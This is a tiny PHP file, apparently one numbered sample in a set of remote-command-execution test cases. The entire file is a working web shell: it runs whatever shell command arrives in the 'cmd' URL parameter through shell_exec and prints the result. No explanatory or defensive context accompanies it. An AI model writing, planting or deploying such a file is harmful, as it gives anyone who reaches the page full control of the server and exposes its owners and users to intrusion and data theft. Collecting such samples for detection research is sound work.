<?php
// RCE test variation #226
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>